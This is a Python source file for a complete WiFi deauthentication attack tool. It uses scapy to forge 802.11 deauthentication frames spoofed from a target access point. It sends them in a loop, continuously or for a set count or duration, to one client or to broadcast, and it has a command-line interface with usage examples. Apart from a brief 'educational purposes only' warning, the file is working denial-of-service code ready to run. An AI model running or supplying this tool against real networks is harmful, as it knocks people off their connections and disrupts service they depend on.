"""
Deauthentication Attack Tool
=============================
Educational tool for demonstrating WiFi deauthentication attacks.
Sends deauthentication packets to disconnect clients from a network.

WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.
Using it on networks you don't own may be illegal.

Requires: scapy, administrator privileges
"""

import argparse
import sys
import time
from typing import Optional

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
except ImportError:
    print("[!] Scapy not installed. Install with: pip install scapy")
    sys.exit(1)


class DeauthAttack:
    """Perform deauthentication attacks on WiFi networks."""

    def __init__(self, interface: str, target_bssid: str, client_mac: Optional[str] = None):
        """
        Initialize deauthentication attack.

        Args:
            interface: Network interface (e.g., wlan0)
            target_bssid: BSSID of target access point
            client_mac: Specific client MAC (None for broadcast)
        """
        self.interface = interface
        self.target_bssid = target_bssid
        self.client_mac = client_mac or "FF:FF:FF:FF:FF:FF"  # Broadcast

    def create_deauth_packet(self) -> RadioTap:
        """Create a deauthentication packet."""
        # Create 802.11 deauth frame
        deauth = Dot11Deauth(
            addr1=self.client_mac,      # Destination (client)
            addr2=self.target_bssid,    # Source (AP)
            addr3=self.target_bssid     # BSSID
        )

        # Add radio tap header
        packet = RadioTap() / Dot11(
            addr1=self.client_mac,
            addr2=self.target_bssid,
            addr3=self.target_bssid
        ) / deauth

        return packet

    def send_deauth_packets(self, count: int = 0, interval: float = 0.1) -> None:
        """
        Send deauthentication packets.

        Args:
            count: Number of packets to send (0 = continuous)
            interval: Time between packets in seconds
        """
        packet = self.create_deauth_packet()

        print(f"[*] Starting deauthentication attack...")
        print(f"    Interface: {self.interface}")
        print(f"    Target BSSID: {self.target_bssid}")
        print(f"    Client MAC: {self.client_mac}")
        print(f"    Packet count: {'Continuous' if count == 0 else count}")
        print(f"    Interval: {interval}s")
        print("\n[!] Press Ctrl+C to stop\n")

        try:
            sent = 0
            while count == 0 or sent < count:
                sendp(packet, iface=self.interface, verbose=False)
                sent += 1

                if sent % 10 == 0:
                    print(f"[+] Sent {sent} deauth packets")

                time.sleep(interval)

        except KeyboardInterrupt:
            print(f"\n[!] Attack stopped. Total packets sent: {sent}")
        except Exception as e:
            print(f"[!] Error sending packets: {e}")
            print("[!] Make sure you have administrator privileges and the interface is in monitor mode")

    @staticmethod
    def perform_attack(target_bssid: str, client_mac: str = None, duration: int = 10, interface: str = "wlan0") -> dict:
        """
        Perform deauthentication attack.

        Args:
            target_bssid: BSSID of target access point
            client_mac: Specific client MAC (None for broadcast)
            duration: Attack duration in seconds
            interface: Network interface in monitor mode

        Returns:
            dict: Attack results
        """
        try:
            attacker = DeauthAttack(interface, target_bssid, client_mac)
            packet = attacker.create_deauth_packet()

            print(f"[*] Starting deauthentication attack...")
            print(f"    Target BSSID: {target_bssid}")
            print(f"    Client MAC: {client_mac or 'Broadcast'}")
            print(f"    Duration: {duration}s")
            print(f"    Interface: {interface}")

            sent_packets = 0
            start_time = time.time()

            while time.time() - start_time < duration:
                sendp(packet, iface=interface, verbose=False)
                sent_packets += 1
                time.sleep(0.1)  # Send packet every 100ms

            return {
                'success': True,
                'packets_sent': sent_packets,
                'duration': duration,
                'target_bssid': target_bssid,
                'client_mac': client_mac,
                'interface': interface
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'target_bssid': target_bssid,
                'client_mac': client_mac
            }

    @staticmethod
    def list_interfaces() -> None:
        """List available network interfaces."""
        try:
            from scapy.all import get_if_list
            interfaces = get_if_list()
            print("Available interfaces:")
            for iface in interfaces:
                print(f"  - {iface}")
        except Exception as e:
            print(f"[!] Error listing interfaces: {e}")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='Deauthentication Attack Tool - Educational WiFi Security Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python deauth_attack.py -i wlan0 -b 00:11:22:33:44:55
  python deauth_attack.py -i wlan0 -b 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -n 100
  python deauth_attack.py --list-interfaces

⚠️  WARNING ⚠️
This tool is for EDUCATIONAL PURPOSES ONLY.
Using it on networks you don't own may be illegal.
Requires administrator/root privileges and monitor mode interface.
        """
    )

    parser.add_argument('-i', '--interface', required=True,
                       help='Network interface in monitor mode')
    parser.add_argument('-b', '--bssid', required=True,
                       help='BSSID of target access point (e.g., 00:11:22:33:44:55)')
    parser.add_argument('-c', '--client', default=None,
                       help='Client MAC address (default: broadcast)')
    parser.add_argument('-n', '--count', type=int, default=0,
                       help='Number of packets to send (0 = continuous)')
    parser.add_argument('--interval', type=float, default=0.1,
                       help='Time between packets in seconds (default: 0.1)')
    parser.add_argument('--list-interfaces', action='store_true',
                       help='List available network interfaces')

    args = parser.parse_args()

    if args.list_interfaces:
        DeauthAttack.list_interfaces()
        return

    # Validate MAC addresses
    import re
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')

    if not mac_pattern.match(args.bssid):
        print("[!] Invalid BSSID format. Use format: 00:11:22:33:44:55")
        sys.exit(1)

    if args.client and not mac_pattern.match(args.client):
        print("[!] Invalid client MAC format. Use format: AA:BB:CC:DD:EE:FF")
        sys.exit(1)

    # Create and run attack
    attacker = DeauthAttack(args.interface, args.bssid, args.client)
    attacker.send_deauth_packets(args.count, args.interval)


if __name__ == '__main__':
    main()
